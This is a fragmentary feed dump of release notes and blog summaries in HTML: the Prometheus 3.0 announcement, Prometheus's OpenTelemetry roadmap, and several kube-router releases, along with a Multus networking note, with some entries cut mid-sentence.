      "summary": "<p>Following the recent release of <a href=\"https://prometheus.io/blog/2024/09/11/prometheus-3-beta/\">Prometheus 3.0 beta</a> at PromCon in Berlin, the Prometheus Team\nis excited to announce the immediate availability of Prometheus Version 3.0!</p>\n<p>This latest version marks a significant milestone as it is the first major release in 7 years. Prometheus has come a long way in that time,\nevolving from a project for early adopters to becoming a standard part of the cloud native monitoring stack. Prometheus 3.0 aims to\ncontinue that journey by adding some exciting new features while largely maintaining stability and compatibility with previous versions.</p>\n<p>The full 3.0 release adds some new features on top of the beta and also introduces a few additional breaking changes that we will describe in this article.</p>\n<h2>What's New</h2>\n<p>Here is a summary of the exciting changes that have been released as part of the beta version, as well as what has been added since:</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand-new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-11-14/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view,\nand will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.</p>\n<p>Since the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please\n<a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<p>Since the beta, the user interface has been updated to support UTF-8 metric and label names.</p>\n<p><img alt=\"New UTF-8 UI\" src=\"https://prometheus.io/assets/blog/2024-11-14/utf8_ui.png\" /></p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars,\ncreated timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing.\nThere is better handling for partial writes to provide more details to clients when this occurs. More details can be found\n<a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>UTF-8 Support</h3>\n<p>Prometheus now allows all valid UTF-8 characters to be used in metric and label names by default, as well as label values,\nas has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8,\nmetric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax\nin order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Currently only the Go client library has been updated to support UTF-8, but support for other languages will be added soon.</p>\n<h3>OTLP Support</h3>\n<p>In alignment with <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">our commitment to OpenTelemetry</a>, Prometheus 3.0 features\nseveral new features to improve interoperability with OpenTelemetry.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the <code>/api/v1/otlp/v1/metrics</code> endpoint.</p>\n<p>See our <a href=\"https://prometheus.io/docs/guides/opentelemetry\">guide</a> on best practices for consuming OTLP metric traffic into Prometheus.</p>\n<h4>UTF-8 Normalization</h4>\n<p>With Prometheus 3.0, thanks to <a href=\"https://prometheus.io/blog/feed.xml#utf-8-support\">UTF-8 support</a>, users can store and query OpenTelemetry metrics without annoying changes to metric and label names like <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/pkg/translator/prometheus\">changing dots to underscores</a>.</p>\n<p>Notably this allows <strong>less confusion</strong> for users and tooling in terms of the discrepancy between what’s defined in OpenTelemetry semantic convention or SDK and what’s actually queryable.</p>\n<p>To achieve this for OTLP ingestion, Prometheus 3.0 has experimental support for different translation strategies. See <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#:~:text=Settings%20related%20to%20the%20OTLP%20receiver%20feature\">otlp section in the Prometheus configuration</a> for details.</p>\n<blockquote>\n<p>NOTE: While “NoUTF8EscapingWithSuffixes” strategy allows special characters, it still adds required suffixes for the best experience. See <a href=\"https://github.com/prometheus/proposals/pull/39\">the proposal on the future work to enable no suffixes</a> in Prometheus.</p>\n</blockquote>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>. Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Breaking Changes</h3>\n<p>The Prometheus community strives to <a href=\"https://prometheus.io/docs/prometheus/latest/stability/\">not break existing features within a major release</a>. With a new major release we took the opportunity to clean up a few, but small, long-standing issues. In other words, Prometheus 3.0 contains a few breaking changes. This includes changes to feature flags, configuration files, PromQL, and scrape protocols.</p>\n<p>Please read the <a href=\"https://prometheus.io/docs/prometheus/3.0/migration/\">migration guide</a> to find out if your setup is affected and what actions to take.</p>\n<h2>Performance</h2>\n<p>It’s impressive to see what we have accomplished in the community since Prometheus 2.0. We all love numbers, so let’s celebrate the efficiency improvements we made for both CPU and memory use for the TSDB mode. Below you can see performance numbers between 3 Prometheus versions on the node with 8 CPU and 49 GB allocatable memory.</p>\n<ul>\n<li>2.0.0 (7 years ago)</li>\n<li>2.18.0 (4 years ago)</li>\n<li>3.0.0 (now)</li>\n</ul>\n<p><img alt=\"Memory bytes\" src=\"https://prometheus.io/assets/blog/2024-11-14/memory_bytes_ui.png\" /></p>\n<p><img alt=\"CPU seconds\" src=\"https://prometheus.io/assets/blog/2024-11-14/cpu_seconds_ui.png\" /></p>\n<p>It’s furthermore impressive that those numbers were taken using our <a href=\"https://github.com/prometheus/prometheus/pull/15366\">prombench macrobenchmark</a>\nthat uses the same PromQL queries, configuration and environment–highlighting backward compatibility and stability for the core features, even with 3.0.</p>\n<h2>What's Next</h2>\n<p>There are still tons of exciting features and improvements we can make in Prometheus and the ecosystem. Here is a non-exhaustive list to get you excited and…\nhopefully motivate you to contribute and join us!</p>\n<ul>\n<li>New, more inclusive <strong>governance</strong></li>\n<li>More <strong>OpenTelemetry</strong> compatibility and features</li>\n<li>OpenMetrics 2.0, now under Prometheus governance!</li>\n<li>Native Histograms stability (and with custom buckets!)</li>\n<li>More optimizations!</li>\n<li>UTF-8 support coverage in more SDKs and tools</li>\n</ul>\n<h2>Try It Out!</h2>\n<p>You can try out Prometheus 3.0 by downloading it from our <a href=\"https://prometheus.io/download/#prometheus\">official binaries</a> and <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">container images</a>.</p>\n<p>If you are upgrading from Prometheus 2.x, check out the migration guide for more information on any adjustments you will have to make.\nPlease note that we strongly recommend upgrading to v2.55 before upgrading to v3.0. Rollback is possible from v3.0 to v2.55, but not to earlier versions.</p>\n<p>As always, we welcome feedback and contributions from the community!</p>",

PromQL queries can be written with the new quoting syntax in order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Not all language bindings have been updated with support for UTF-8 but the primary Go libraries have been.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the /api/v1/otlp/v1/metrics endpoint.</p>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>.  Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Other Breaking Changes</h3>\n<p>The following feature flags have been removed, being enabled by default instead. References to these flags should be removed from configs, and will be ignored in Prometheus starting with version 3.0</p>\n<ul>\n<li><code>promql-at-modifier</code></li>\n<li><code>promql-negative-offset</code></li>\n<li><code>remote-write-receiver</code></li>\n<li><code>no-scrape-default-port</code></li>\n<li><code>new-service-discovery-manager</code></li>\n</ul>\n<p>Range selections are now <a href=\"https://github.com/prometheus/prometheus/issues/13213\">left-open and right-closed</a>, which will avoid rare occasions that more points than intended are included in operations.</p>\n<p>Agent mode is now stable and has its own config flag instead of a feature flag</p>",

      "summary": "<p><em>The <a href=\"https://opentelemetry.io/\">OpenTelemetry project</a> is an Observability framework and toolkit designed to create and manage telemetry data such as traces, metrics, and logs. It is gaining widespread adoption due to its consistent specification between signals and promise to reduce vendor lock-in which is something that we’re excited about.</em></p>\n<h2>Looking back at 2023</h2>\n<p>Over the past few years, we have collaborated with the OpenTelemetry community to make sure that OpenTelemetry and Prometheus support each other bidirectionally. This led to the drafting of the official specification to convert between the two systems, as well as the implementations that allow you to ingest Prometheus metrics into OpenTelemetry Collector and vice-versa.</p>\n<p>Since then, we have spent a significant amount of time understanding the <a href=\"https://docs.google.com/document/d/1epvoO_R7JhmHYsII-GJ6Yw99Ky91dKOqOtZGqX7Bk0g/edit?usp=sharing\">challenges faced by OpenTelemetry users</a> when storing their metrics in Prometheus and based on those, explored <a href=\"https://docs.google.com/document/d/1NGdKqcmDExynRXgC_u1CDtotz9IUdMrq2yyIq95hl70/edit?usp=sharing\">how we can address them</a>. Some of the changes proposed need careful considerations to avoid breaking either side's operating promises, e.g. supporting both push and pull. At PromCon Berlin 2023, we attempted to summarize our ideas in <a href=\"https://www.youtube.com/watch?v=mcabOH70FqU\">one of the talks</a>.</p>\n<p>At our <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.9kp854ea3sv4\">dev summit in Berlin</a>, we spent the majority of our time discussing these changes and our general stance on OpenTelemetry in depth, and the broad consensus is that we want <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.196i9ij1u7fs\">“to be the default store for OpenTelemetry metrics”</a>!</p>\n<p>We’ve formed a core group of developers to lead this initiative, and we are going to release a Prometheus 3.0 in 2024 with OTel support as one of its more important features. Here’s a sneak peek at what's coming in 2024.</p>\n<h2>The year ahead</h2>\n<h3>OTLP Ingestion GA</h3>\n<p>In <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.47.0\">Prometheus v2.47.0</a>, released on 6th September 2023, we added experimental support for OTLP ingestion in Prometheus. We’re constantly improving this and we plan to add support for staleness and make it a stable feature. We will also mark our support for out-of-order ingestion as stable. This involves also GA-ing our support for native / exponential histograms.</p>\n<h3>Support UTF-8 metric and label names</h3>\n<p><a href=\"https://github.com/open-telemetry/semantic-conventions/blob/main/docs/http/http-metrics.md\">OpenTelemetry semantic conventions</a> push for <code>“.”</code> to be the namespacing character. For example, <code>http.server.request.duration</code>. However, Prometheus currently requires a <a href=\"https://prometheus.io/docs/instrumenting/writing_exporters/#naming\">more limited character set</a>, which means we convert the metric to <code>http_server_request_duration</code> when ingesting it into Prometheus.</p>\n<p>This causes unnecessary dissonance and we’re working on removing this limitation by adding UTF-8 support for all labels and metric names. The progress is tracked <a href=\"https://github.com/prometheus/prometheus/issues/13095\">here</a>.</p>\n<h3>Native support for resource attributes</h3>\n<p>OpenTelemetry differentiates between metric attributes (labels to identify the metric itself, like <code>http.status_code</code>) and resource attributes (labels to identify the source of the metrics, like <code>k8s.pod.name</code>), while Prometheus has a more flat label schema. This leads to many usability issues that are detailed <a href=\"https://docs.google.com/document/d/1gG-eTQ4SxmfbGwkrblnUk97fWQA93umvXHEzQn2Nv7E/edit?usp=sharing\">here</a>.</p>\n<p>We’re <a href=\"https://docs.google.com/document/d/1FgHxOzCQ1Rom-PjHXsgujK8x5Xx3GTiwyG__U3Gd9Tw/edit\">exploring several solutions</a> to this problem from many fronts (Query, UX, storage, etc.), but our goal is to make it quite easy to filter and group on resource attributes. This is a work in progress, and feedback and help are wanted!</p>\n<h3>OTLP export in the ecosystem</h3>\n<p>Prometheus remote write is supported by <a href=\"https://prometheus.io/docs/operating/integrations/#remote-endpoints-and-storage\">most of the leading Observability projects and vendors</a> already. However, OpenTelemetry Protocol (OTLP) is gaining prominence and we would like to support it across the Prometheus ecosystem.</p>\n<p>We would like to add support for it to the Prometheus server, SDKs and the exporters. This would mean that any service instrumented with the Prometheus SDKs will also be able to <em>push</em> OTLP and it will unlock the rich Prometheus exporter ecosystem for OpenTelemetry users.</p>\n<p>However, we intend to keep and develop the OpenMetrics exposition format as an optimized / simplified format for Prometheus and pull-based use-cases.</p>\n<h3>Delta temporality</h3>\n<p>The OpenTelemetry project also supports <a href=\"https://grafana.com/blog/2023/09/26/opentelemetry-metrics-a-guide-to-delta-vs.-cumulative-temporality-trade-offs/\">Delta temporality</a> which has some use-cases for the Observability ecosystem. We have a lot of Prometheus users still running statsd and using the statsd_exporter for various reasons.</p>\n<p>We would like to support the Delta temporality of OpenTelemetry in the Prometheus server and are <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/issues/30479\">working towards it</a>.</p>\n<h2>Call for contributions!</h2>\n<p>As you can see, a lot of new and exciting things are coming to Prometheus! If working in the intersection between two of the most relevant open-source projects around observability sounds challenging and interesting to you, we'd like to have you on board!</p>\n<p>This year there is also a change of governance in the works that will make the process of becoming a maintainer easier than ever! If you ever wanted to have an impact on Prometheus, now is a great time to get started.</p>\n<p>Our first focus has always been to be as open and transparent as possible on how we are organizing all the work above so that you can also contribute. We are looking for contributors to support this initiative and help implement these features. Check out the <a href=\"https://github.com/orgs/prometheus/projects/9\">Prometheus 3.0 public board</a> and <a href=\"https://github.com/prometheus/prometheus/issues?q=is%3Aopen+is%3Aissue+milestone%3A%22OTEL+Support%22\">Prometheus OTel support milestone</a> to track the progress of the feature development and see ways that you can <a href=\"https://github.com/prometheus/prometheus/blob/main/CONTRIBUTING.md\">contribute</a>.</p>\n<h2>Conclusion</h2>\n<p>Some of the changes proposed are large and invasive or involve a fundamental departure from the original data model of Prometheus. However, we plan to introduce these gracefully so that Prometheus 3.0 will have no major breaking changes and most of the users can upgrade without impact.</p>\n<p>We are excited to embark on this new chapter for Prometheus and would love your feedback on the changes suggested.</p>",

Containerd functionality is unchanged in that it uses the value for the IP addresses specifically</p>\n</blockquote>\n<blockquote>\n<p>It's worth noting that CNI ADD success results which do not contain any interfaces will be discarded in this determination of the default, therefore it's recommended to set one with an associated gateway if aiming to have it be noted as the default.</p>\n</blockquote>\n<p>See also:<br />\n<a href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5\">https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5</a> <a class=\"issue-link js-issue-link\" href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/pull/73\">k8snetworkplumbingwg/network-attachment-definition-client#73</a></p>",

However, they can also now be configured using a<br />\nconsolidated embedded yaml form:</p>\n<div class=\"highlight highlight-source-yaml notranslate position-relative overflow-auto\"><pre><span class=\"pl-s\">kubectl annotate node &lt;kube-node&gt; \\</span>\n<span class=\"pl-s\">kube-router.io/peers=\"$(cat &lt;&lt;'EOF'</span>\n- <span class=\"pl-ent\">remoteip</span>: <span class=\"pl-s\">192.168.1.99</span>\n  <span class=\"pl-ent\">remoteasn</span>: <span class=\"pl-c1\">65000</span>\n  <span class=\"pl-ent\">password</span>: <span class=\"pl-s\">U2VjdXJlUGFzc3dvcmQK</span>\n- <span class=\"pl-ent\">remoteip</span>: <span class=\"pl-s\">192.168.1.100</span>\n  <span class=\"pl-ent\">remoteasn</span>: <span class=\"pl-c1\">65000</span>\n  <span class=\"pl-ent\">password</span>: <span class=\"pl-s\">U2VjdXJlUGFzc3dvcmQK</span>\n<span class=\"pl-s\">EOF</span>\n<span class=\"pl-s\">)\"</span></pre></div>\n<p>See <a href=\"https://github.com/cloudnativelabs/kube-router/blob/master/docs/bgp.md#using-consolidated-annotation\">using consolidated annotations</a> for more information.</p>\n<h3>Other Notable Changes</h3>\n<ul>\n<li>Add better unit testing to Network Services Controller (<code>--run-service-proxy</code>) to prevent future regressions - This<br />\nhopefully helps curb one of the largest sources of functionality regressions over the past several years within<br />\nkube-router</li>\n<li>Configure AFI SAFI for dual stack clusters regardless of graceful restart setting - Previously, this was configured for the<br />\nprimary IP family (becuase GoBGP does this by default), but the secondary family would only get AFI SAFI<br />\nconfigurations if graceful restart was configured (<code>--bgp-graceful-restart</code>)</li>\n<li>Correctly configure TCPMSS for IPv6 tunnels - Previously TCPMSS clamping was a one-size-fits-all based on the size of<br />\nIPv4 headers. Now they are properly configured per family</li>\n<li>Retry certain netlink calls which fixes early start race conditions - Some users noticed a race condition on ip link<br />\nsetup when kube-router was starting as the node's OS was also starting. This should fix that edge case.</li>\n</ul>\n<h2>Contributions</h2>\n<p>Thanks to all of the community members that helped contribute to this release!

      "summary": "<h2>Summary</h2>\n<p>It has been more than half a year since our last official kube-router release, so I think we're more than past time to do so. Additionally, there have been quite a few items that have been fixed or upgraded.</p>\n<h3>Highlights &amp; Changed Functionality</h3>\n<ul>\n<li>The Network Services Controller (enabled via <code>--run-service-proxy</code>) now fetches metrics when the metrics URL is hit rather than on the sync period (<code>--ipvs-sync-period</code>). This allows for more fine-grained and up-to-date metrics on IPVS services. (Thanks <a class=\"user-mention notranslate\" href=\"https://github.com/rkojedzinszky\">@rkojedzinszky</a>!)</li>\n<li>Service's <code>externalIP</code> and <code>LoadBalancerIP</code> are now labels on IPVS metrics which can increase cardinality, but also provides better visibility for services. Prior to this, only the <code>ClusterIP</code> or <code>NodePort</code> labels were added to metrics.</li>\n<li>The GoBGP port can be changed or disabled via <code>--gpbgp-admin-port</code> to create more secure / flexible deployments of kube-router</li>\n<li>We converted a lot of exec's  out to <code>iproute2</code> into <code>netlink</code> library calls, making the code more idiomatic, faster, and less fragile to userspace tooling changes</li>\n<li>When both DSR and Maglev is enabled on a service kube-router will automatically enable the kernel option <code>sloppy_tcp</code> for IPVS which allows for greater service routing consistency when transitioning nodes (Thanks <a class=\"user-mention notranslate\" href=\"https://github.com/AnupamGhosh\">@AnupamGhosh</a>!)</li>\n<li>All references to Endpoints has been removed since the API is now fully deprecated and EndpointSlices is now used behind the scenes</li>\n</ul>\n<h3>Fixed Issues</h3>\n<ul>\n<li><a href=\"https://github.com/cloudnativelabs/kube-router/issues/1895\">1895</a> - IPv6 NDP NA/NS dropped when using egress network policy</li>\n<li><a href=\"https://github.com/cloudnativelabs/kube-router/issues/1875\">1875</a> - Collect service statistics real-time</li>\n<li><a href=\"https://github.com/cloudnativelabs/kube-router/issues/1860\">1888</a> -

      "summary": "<h2>Summary</h2>\n<p>This update is mainly a dependency and docker image base update. For a long time, kube-router has been stalled on Alpine 3.18 because of a breaking change with the upstream iptables user space. However, this was fixed in <code>iptables-1.8.11</code> which was released in November and then was integrated into Alpine 3.21 early this Month. See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1789\">#1789</a> for more information.</p>\n<p>This should make kube-router much more tolerant of iptables / nftables rules added by recent versions of the netfilter userspaces.</p>\n<p>This release does contain a few prominent fixes since the last release of v2.4.1:</p>\n<ul>\n<li><code>ipset.Save()</code> was introduced at the start of the NetworkPolicyController resolving a race condition between the NetworkPolicyController (<code>--run-firewall</code>) and the NetworkServiceController (<code>--run-service-proxy</code>). See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/pull/1806\">#1806</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/alexcriss\">@alexcriss</a> for reporting this and being patient while we tried to reproduce)</li>\n<li>Internal cluster traffic is now properly excluded from NAT conditions which resolves a regression that was introduced in the v2.3 release line. See: <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1778\">#1778</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/zerkms\">@zerkms</a> for reporting this)</li>\n</ul>\n<p>Other major dependency updates:</p>\n<ul>\n<li>Bundled CNI plugins have been updated from v1.4.0 -&gt; v1.6.2</li>\n<li>Go version has been updated from v1.22.3 -&gt; v1.23.6</li>\n</ul>\n<h2>Contributions</h2>\n<p>Special thanks to <a class=\"user-mention notranslate\" href=\"https://github.com/rbrtbnfgl\">@rbrtbnfgl</a> and <a class=\"user-mention notranslate\" href=\"https://github.com/dsseng\">@dsseng</a> for their contributions to this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/85e429e9c72b2bc7de93b5f1bcce20e7c924386d\"><tt>85e429e</tt></a> -
